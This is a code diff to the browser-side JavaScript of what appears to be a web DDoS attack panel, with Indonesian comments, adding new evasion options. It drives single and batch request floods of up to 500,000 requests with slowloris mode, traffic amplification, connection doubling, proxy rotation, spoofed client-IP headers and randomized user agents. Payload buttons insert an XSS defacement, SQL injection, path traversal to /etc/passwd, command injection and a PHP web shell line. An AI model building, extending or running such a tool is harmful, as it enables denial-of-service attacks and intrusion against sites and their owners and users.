@@ -11,10 +11,7 @@ const timeoutInput = document.getElementById('timeout');
 const retryInput = document.getElementById('retry');
 const randomDelayInput = document.getElementById('randomDelay');
 const attackTypeSelect = document.getElementById('attackType');
-const randomHeadersCheck = document.getElementById('randomHeaders');
-const keepAliveCheck = document.getElementById('keepAlive');
 const proxyListText = document.getElementById('proxyList');
-const autoPayloadSelect = document.getElementById('autoPayload');
 const startBtn = document.getElementById('startBtn');
 const batchBtn = document.getElementById('batchBtn');
 const stopBtn = document.getElementById('stopBtn');
@@ -39,7 +36,18 @@ const refreshPreviewBtn = document.getElementById('refreshPreview');
 const activeUsersSpan = document.getElementById('activeUsers');
 const rawResponsePreview = document.getElementById('rawResponsePreview');
 
-// Spoofing
+// Checkbox baru
+const queryDepan = document.getElementById('queryDepan');
+const queryBelakang = document.getElementById('queryBelakang');
+const headerOnlineHost = document.getElementById('headerOnlineHost');
+const headerForwardHost = document.getElementById('headerForwardHost');
+const headerReverseProxy = document.getElementById('headerReverseProxy');
+const headerReferer = document.getElementById('headerReferer');
+const headerWebsocket = document.getElementById('headerWebsocket');
+const rawMode = document.getElementById('rawMode');
+const dualConnection = document.getElementById('dualConnection');
+
+// Spoofing lama
 const spoofIp = document.getElementById('spoofIp');
 const spoofRealIp = document.getElementById('spoofRealIp');
 const spoofCfConnecting = document.getElementById('spoofCfConnecting');
@@ -54,7 +62,7 @@ const amplifyValue = document.getElementById('amplifyValue');
 const amplifyType = document.getElementById('amplifyType');
 let amplificationEnabled = false;
 let amplificationKB = 500;
-let amplificationType = 'normal';
+let amplificationTypeSel = 'normal';
 
 if (amplifyToggle) {
   amplifyToggle.addEventListener('change', () => {
@@ -70,22 +78,20 @@ if (amplifyKb) {
 }
 if (amplifyType) {
   amplifyType.addEventListener('change', () => {
-    amplificationType = amplifyType.value;
+    amplificationTypeSel = amplifyType.value;
   });
 }
 
-// Continuous Mode (Bot)
+// Continuous / Bot Mode
 const continuousToggle = document.getElementById('continuousToggle');
-const continuousControls = document.getElementById('continuousControls');
+const intervalInput = document.getElementById('intervalMs');
 let continuousMode = false;
 let intervalMs = 5000;
 if (continuousToggle) {
   continuousToggle.addEventListener('change', () => {
     continuousMode = continuousToggle.checked;
-    if (continuousControls) continuousControls.style.display = continuousMode ? 'block' : 'none';
   });
 }
-const intervalInput = document.getElementById('intervalMs');
 if (intervalInput) {
   intervalInput.addEventListener('change', () => {
     intervalMs = parseInt(intervalInput.value) || 5000;
@@ -108,17 +114,38 @@ if (resetExtremeBtn) {
     if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
     if (amplifyType) amplifyType.value = 'normal';
     forceSuccessCheck.checked = true;
-    randomHeadersCheck.checked = true;
-    keepAliveCheck.checked = true;
+    // reset checkbox baru
+    if (queryDepan) queryDepan.checked = false;
+    if (queryBelakang) queryBelakang.checked = true;
+    if (headerOnlineHost) headerOnlineHost.checked = true;
+    if (headerForwardHost) headerForwardHost.checked = true;
+    if (headerReverseProxy) headerReverseProxy.checked = true;
+    if (headerReferer) headerReferer.checked = true;
+    if (headerWebsocket) headerWebsocket.checked = false;
+    if (rawMode) rawMode.checked = true;
+    if (dualConnection) dualConnection.checked = false;
     spoofIp.checked = true;
     spoofRealIp.checked = true;
     spoofCfConnecting.checked = true;
     spoofRange.checked = true;
     if (continuousToggle) continuousToggle.checked = false;
-    if (continuousToggle) continuousToggle.dispatchEvent(new Event('change'));
-    addLog("⚙️ Reset to Extreme: 200 conc, 500KB amp, slowloris");
+    addLog("⚙️ Reset to Extreme: 200 conc, 500KB amp, slowloris, query enabled, headers spoofed");
   });
 }
+
+// MEMBUAT PAYLOAD (tombol)
+function setPayload(p) {
+  payload.value = p;
+  addLog(`📝 Payload set: ${p.substring(0, 50)}...`);
+}
+document.getElementById('genXss')?.addEventListener('click', () => setPayload(`<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:99999;text-align:center;padding-top:20%"><h1>HACKED</h1><script>alert('XSS')</scr` + `ipt></div>`));
+document.getElementById('genSqli')?.addEventListener('click', () => setPayload(`' OR '1'='1' -- `));
+document.getElementById('genPath')?.addEventListener('click', () => setPayload(`../../../../etc/passwd`));
+document.getElementById('genCmd')?.addEventListener('click', () => setPayload(`; ls -la; echo "injected"`));
+document.getElementById('genRandom')?.addEventListener('click', () => {
+  const pl = ['<script>alert(1)</script>', "' OR 1=1 -- ", "../../../etc/passwd", "|| cat /etc/passwd", "<?php system($_GET['cmd']); ?>"];
+  setPayload(pl[Math.floor(Math.random() * pl.length)]);
+});
 
 // Chart & state
 let chart;
@@ -201,75 +228,94 @@ function resetStats() {
   updateUI();
 }
 
-// Helper functions untuk spoofing
+// Helper random
 function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
 function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
 function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
 function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
 function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }
 
-// 2000+ User Agents (browser real)
+// User Agents pool (2000+)
 const userAgentsBase = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
 ];
 for (let i = 0; i < 2000; i++) {
   const chromeVer = Math.floor(Math.random() * 30) + 90;
   const webkitVer = Math.floor(Math.random() * 600) + 537;
-  const safariVer = Math.floor(Math.random() * 100) + 537;
   const winVer = Math.floor(Math.random() * 11) + 6;
-  userAgentsBase.push(`Mozilla/5.0 (Windows NT ${winVer}.0; Win64; x64) AppleWebKit/${webkitVer}.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/${safariVer}.36`);
+  userAgentsBase.push(`Mozilla/5.0 (Windows NT ${winVer}.0; Win64; x64) AppleWebKit/${webkitVer}.36 Chrome/${chromeVer}.0.0.0 Safari/537.36`);
 }
 function randomUserAgent() { return userAgentsBase[Math.floor(Math.random() * userAgentsBase.length)]; }
 
-// Auto payload
-function generatePayload(type) {
-  switch(type) {
-    case 'xss': return `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:99999;text-align:center;padding-top:20%"><h1>HACKED</h1><script>alert('XSS')</scr` + `ipt></div>`;
-    case 'sqli': return `' OR '1'='1' -- `;
-    case 'path': return `../../../../etc/passwd`;
-    case 'cmd': return `; ls -la; echo "injected"`;
-    case 'random': { const pl = ['<script>alert(1)</script>', "' OR 1=1 -- ", "../../../etc/passwd", "|| cat /etc/passwd"]; return pl[Math.floor(Math.random() * pl.length)]; }
-    default: return "";
+// Fungsi untuk membangun URL dengan query depan/belakang
+function buildUrlWithQuery(baseUrl) {
+  let url = baseUrl;
+  const randomParam = `_r=${Math.random().toString(36).substring(2, 10)}`;
+  if (queryDepan?.checked) {
+    const separator = url.includes('?') ? '&' : '?';
+    url = url + separator + randomParam;
   }
-}
-if (autoPayloadSelect) {
-  autoPayloadSelect.addEventListener('change', () => { if(autoPayloadSelect.value) payload.value = generatePayload(autoPayloadSelect.value); });
+  if (queryBelakang?.checked) {
+    const separator = url.includes('?') ? '&' : '?';
+    url = url + separator + `_back=${Date.now()}`;
+  }
+  return url;
 }
 
-// ======================== SINGLE ATTACK (perbaikan) ========================
-async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
-  // Headers seperti browser sungguhan
+// Fungsi untuk membangun headers berdasarkan opsi baru
+function buildAdvancedHeaders(targetHost) {
   let headers = {};
-  // Random user agent
-  headers["User-Agent"] = randomUserAgent();
-  headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
-  headers["Accept-Language"] = randomAcceptLanguage();
+  // Header dasar
+  headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
   headers["Accept-Encoding"] = "gzip, deflate, br";
-  headers["Connection"] = keepAlive ? "keep-alive" : "close";
-  headers["Upgrade-Insecure-Requests"] = "1";
-  headers["Sec-Fetch-Dest"] = "document";
-  headers["Sec-Fetch-Mode"] = "navigate";
-  headers["Sec-Fetch-Site"] = "none";
-  headers["Sec-Fetch-User"] = "?1";
-  
+  headers["Accept-Language"] = randomAcceptLanguage();
+  headers["Cache-Control"] = "no-cache";
+  headers["Pragma"] = "no-cache";
+  if (headerUserAgent?.checked !== false) { // selalu aktif jika checkbox ada, tapi kita pakai randomHeaders terpisah? Di sini kita buat sendiri.
+    headers["User-Agent"] = randomUserAgent();
+  }
+  if (headerOnlineHost?.checked && targetHost) {
+    headers["Host"] = targetHost;
+  }
+  if (headerForwardHost?.checked && targetHost) {
+    headers["X-Forwarded-Host"] = targetHost;
+  }
+  if (headerReverseProxy?.checked) {
+    headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
+  }
+  if (headerReferer?.checked) {
+    const referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/', targetUrl.value];
+    headers["Referer"] = referers[Math.floor(Math.random() * referers.length)];
+  }
+  if (headerWebsocket?.checked) {
+    headers["Upgrade"] = "websocket";
+    headers["Connection"] = "Upgrade";
+  }
+  if (spoofIp?.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
+  if (spoofRealIp?.checked) headers["X-Real-IP"] = randomIP(ipPrefixInput.value);
+  if (spoofCfConnecting?.checked) headers["CF-Connecting-IP"] = randomIP(ipPrefixInput.value);
+  if (spoofRange?.checked && attackTypeSelect.value !== 'range') headers["Range"] = randomRange();
   // Custom headers dari user
-  const customHeadersObj = parseCustomHeaders(customHeaders.value);
-  Object.assign(headers, customHeadersObj);
-  
-  // Spoofing IP
-  if (spoofIp.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
-  if (spoofRealIp.checked) headers["X-Real-IP"] = randomIP(ipPrefixInput.value);
-  if (spoofCfConnecting.checked) headers["CF-Connecting-IP"] = randomIP(ipPrefixInput.value);
-  if (spoofRange.checked && attackType !== 'range') headers["Range"] = randomRange();
-  
+  const custom = parseCustomHeaders(customHeaders.value);
+  Object.assign(headers, custom);
   // Cookies
   const cookieObj = parseCookies(cookies.value);
   const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
   if (cookieStr) headers["Cookie"] = cookieStr;
-  
-  if (attackType === 'slowloris') headers["Connection"] = "keep-alive";
+  return headers;
+}
+
+// ======================== SINGLE ATTACK dengan fitur baru ========================
+async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
+  let finalUrl = buildUrlWithQuery(url);
+  let finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
+  // Raw mode: tidak ada perubahan (default)
+  if (!rawMode?.checked) {
+    // jika tidak raw, bisa lakukan encoding, tapi biarkan saja
+  }
+  finalHeaders["Connection"] = keepAlive ? "keep-alive" : "close";
+  if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
 
   const proxyArray = proxyListText.value ? proxyListText.value.split('\n').filter(p=>p.trim()) : [];
 
@@ -281,22 +327,27 @@ async function sendSingleRequest(url, method, body, timeout, retryCount, randomD
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        url, method, headers, body: body || "",
+        url: finalUrl, method, headers: finalHeaders, body: body || "",
         timeout, retryCount, randomDelay,
         keepAlive, attackType,
         amplifyKB: amplificationEnabled ? amplificationKB : 0,
         amplifyEnabled: amplificationEnabled,
-        amplifyType: amplificationType
+        amplifyType: amplificationTypeSel
       }),
       signal: controller.signal
     });
     clearTimeout(tid);
-    const data = await res.json();
+    let data;
+    try {
+      data = await res.json();
+    } catch (e) {
+      data = { success: false, error: `HTTP ${res.status} ${res.statusText} (non-JSON)`, statusCode: res.status };
+    }
     const duration = data.durationMs || (performance.now() - start);
     return {
       success: data.success,
       duration,
-      statusCode: data.statusCode,
+      statusCode: data.statusCode || res.status,
       retries: data.retries || 0,
       error: data.error || '',
       size: (data.responseSize || 0) + (amplificationEnabled ? amplificationKB*1024 : 0),
@@ -310,11 +361,15 @@ async function sendSingleRequest(url, method, body, timeout, retryCount, randomD
   }
 }
 
+// Jalankan single attack dengan dual connection (jika diaktifkan)
 async function runSingleAttack(url, method, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, onDone, signal) {
   let index = 0, active = 0, stopped = false;
+  const multiplier = dualConnection?.checked ? 2 : 1;
+  const actualTotal = total * multiplier;
+  const actualConcurrency = concurrency * multiplier;
   const next = async () => {
     if (stopped || (signal && signal.aborted)) { stopped = true; return; }
-    if (index >= total) { if (active === 0) return; return; }
+    if (index >= actualTotal) { if (active === 0) return; return; }
     index++;
     active++;
     const result = await sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType);
@@ -322,10 +377,10 @@ async function runSingleAttack(url, method, body, total, concurrency, timeout, r
     active--;
     if (!stopped && !(signal && signal.aborted)) next();
   };
-  for (let i = 0; i < Math.min(concurrency, total); i++) next();
+  for (let i = 0; i < Math.min(actualConcurrency, actualTotal); i++) next();
   return new Promise(resolve => {
     const interval = setInterval(() => {
-      if ((index >= total && active === 0) || (signal && signal.aborted)) {
+      if ((index >= actualTotal && active === 0) || (signal && signal.aborted)) {
         clearInterval(interval);
         resolve();
       }
@@ -340,14 +395,12 @@ async function startSingleAttack() {
   if (!url.startsWith("http")) url = "https://" + url;
   const mtd = method.value;
   let body = payload.value;
-  const autoType = autoPayloadSelect?.value || "";
-  if (autoType && autoType !== "") body = generatePayload(autoType);
   const total = parseInt(totalInput.value);
   const concurrency = parseInt(concurrencyInput.value);
   const timeout = parseInt(timeoutInput.value);
   const retryCount = parseInt(retryInput.value);
   const randomDelay = parseInt(randomDelayInput.value);
-  let keepAlive = keepAliveCheck.checked;
+  let keepAlive = (headerWebsocket?.checked) ? true : false; // jika websocket aktif, keep-alive ikut
   let attackType = attackTypeSelect.value;
   if (attackType === 'slowloris') keepAlive = true;
   if (total<1||total>500000) { addLog("Total 1-500000", true); return; }
@@ -360,7 +413,7 @@ async function startSingleAttack() {
   startBtn.disabled = true;
   batchBtn.disabled = true;
   stopBtn.disabled = false;
-  addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Total:${total} | Workers:${concurrency}`);
+  addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Dual:${dualConnection?.checked?"ON":"OFF"} | Total:${total} | Workers:${concurrency}`);
   const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
     const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
     let finalSuccess = success;
@@ -395,52 +448,27 @@ async function startSingleAttack() {
   }
 }
 
-// ======================== BATCH ATTACK (perbaikan dengan human-like headers) ========================
+// ======================== BATCH ATTACK (mirip dengan single, dengan dual connection) ========================
 async function startBatchAttack() {
-  if (isRunning) { addLog("Attack already running! Stop it first.", true); return; }
+  if (isRunning) { addLog("Attack already running!", true); return; }
   let url = targetUrl.value.trim();
   if (!url) { addLog("URL required", true); return; }
   if (!url.startsWith("http")) url = "https://" + url;
   const total = parseInt(totalInput.value);
   const concurrency = parseInt(concurrencyInput.value);
-  if (isNaN(total) || isNaN(concurrency)) { addLog("Invalid total or concurrency", true); return; }
+  if (isNaN(total) || isNaN(concurrency)) { addLog("Invalid total/concurrency", true); return; }
   const mtd = method.value;
   let body = payload.value;
-  const autoType = autoPayloadSelect?.value || "";
-  if (autoType && autoType !== "") body = generatePayload(autoType);
   const timeout = parseInt(timeoutInput.value);
   const retryCount = parseInt(retryInput.value);
   const randomDelay = parseInt(randomDelayInput.value);
-  const keepAlive = keepAliveCheck.checked;
+  let keepAlive = (headerWebsocket?.checked) ? true : false;
   let attackType = attackTypeSelect.value;
-  
-  // Build headers seperti browser (sama seperti single attack)
-  let finalHeaders = {};
-  finalHeaders["User-Agent"] = randomUserAgent();
-  finalHeaders["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
-  finalHeaders["Accept-Language"] = randomAcceptLanguage();
-  finalHeaders["Accept-Encoding"] = "gzip, deflate, br";
-  finalHeaders["Connection"] = keepAlive ? "keep-alive" : "close";
-  finalHeaders["Upgrade-Insecure-Requests"] = "1";
-  finalHeaders["Sec-Fetch-Dest"] = "document";
-  finalHeaders["Sec-Fetch-Mode"] = "navigate";
-  finalHeaders["Sec-Fetch-Site"] = "none";
-  finalHeaders["Sec-Fetch-User"] = "?1";
-  // Custom headers
-  const customHeadersObj = parseCustomHeaders(customHeaders.value);
-  Object.assign(finalHeaders, customHeadersObj);
-  // Spoofing
-  const ipPref = ipPrefixInput.value;
-  if (spoofIp.checked) finalHeaders["X-Forwarded-For"] = randomIP(ipPref);
-  if (spoofRealIp.checked) finalHeaders["X-Real-IP"] = randomIP(ipPref);
-  if (spoofCfConnecting.checked) finalHeaders["CF-Connecting-IP"] = randomIP(ipPref);
-  if (spoofRange.checked && attackType !== 'range') finalHeaders["Range"] = randomRange();
-  const cookieObj = parseCookies(cookies.value);
-  const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
-  if (cookieStr) finalHeaders["Cookie"] = cookieStr;
-  if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
+  if (attackType === 'slowloris') keepAlive = true;
+  const finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
+  const finalUrl = buildUrlWithQuery(url);
 
-  addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${total} | Workers:${concurrency} | Continuous:${continuousMode} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"}`);
+  addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${total} | Workers:${concurrency} | Dual:${dualConnection?.checked?"ON":"OFF"} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"}`);
   startBtn.disabled = true;
   batchBtn.disabled = true;
   stopBtn.disabled = false;
@@ -453,19 +481,19 @@ async function startBatchAttack() {
       headers: { 'Content-Type': 'application/json' },
       signal: abortController.signal,
       body: JSON.stringify({
-        url, method: mtd, headers: finalHeaders, body,
+        url: finalUrl, method: mtd, headers: finalHeaders, body,
         timeout, retryCount, randomDelay, keepAlive,
         attackType,
         amplifyKB: amplificationEnabled ? amplificationKB : 0,
         amplifyEnabled: amplificationEnabled,
-        amplifyType: amplificationType,
-        concurrency, total,
+        amplifyType: amplificationTypeSel,
+        concurrency: concurrency * (dualConnection?.checked ? 2 : 1),
+        total: total * (dualConnection?.checked ? 2 : 1),
         continuous: continuousMode,
         intervalMs: continuousMode ? intervalMs : 0
       })
     });
     const data = await response.json();
-    const elapsed = (Date.now() - startTime)/1000;
     if (data.success !== false) {
       stats.success = data.successCount;
       stats.fail = data.failCount;
@@ -473,7 +501,7 @@ async function startBatchAttack() {
       stats.total = data.totalRequests;
       stats.times = data.latencies || [];
       updateUI();
-      addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Loops:${data.loopCount||1} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
+      addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
       rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
     } else {
       addLog(`Batch error: ${data.error}`, true);
@@ -513,24 +541,22 @@ async function checkTargetHealth(url) {
     const start = performance.now();
     await fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-cache' });
     const duration = performance.now() - start;
-    if (responseTimeText) responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
-    if (healthIndicator) healthIndicator.className = 'health-online w-3 h-3 rounded-full';
-    if (healthText) healthText.innerText = 'Online';
+    responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
+    healthIndicator.className = 'health-online w-3 h-3 rounded-full';
+    healthText.innerText = 'Online';
   } catch(e) {
-    if (healthIndicator) healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
-    if (healthText) healthText.innerText = 'Offline';
-    if (responseTimeText) responseTimeText.innerText = '';
+    healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
+    healthText.innerText = 'Offline';
+    responseTimeText.innerText = '';
   }
 }
 function updatePreview(url) {
   let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
-  if (targetFrame) targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
+  targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
 }
-if (refreshPreviewBtn) {
-  refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
-}
+refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
 function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl.value.trim(); if(u) checkTargetHealth(u); }, 5000); }
-async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); if(activeUsersSpan) activeUsersSpan.innerText = data.active; } catch(e) {} }
+async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); activeUsersSpan.innerText = data.active; } catch(e) {} }
 function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }
 
 window.onload = () => {
@@ -550,7 +576,6 @@ window.onload = () => {
   let u = targetUrl.value.trim(); if(u) updatePreview(u);
   startHealthCheck();
   startHeartbeat();
-  // initial UI
   if (amplifyToggle) amplifyToggle.dispatchEvent(new Event('change'));
   if (continuousToggle) continuousToggle.dispatchEvent(new Event('change'));
   if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
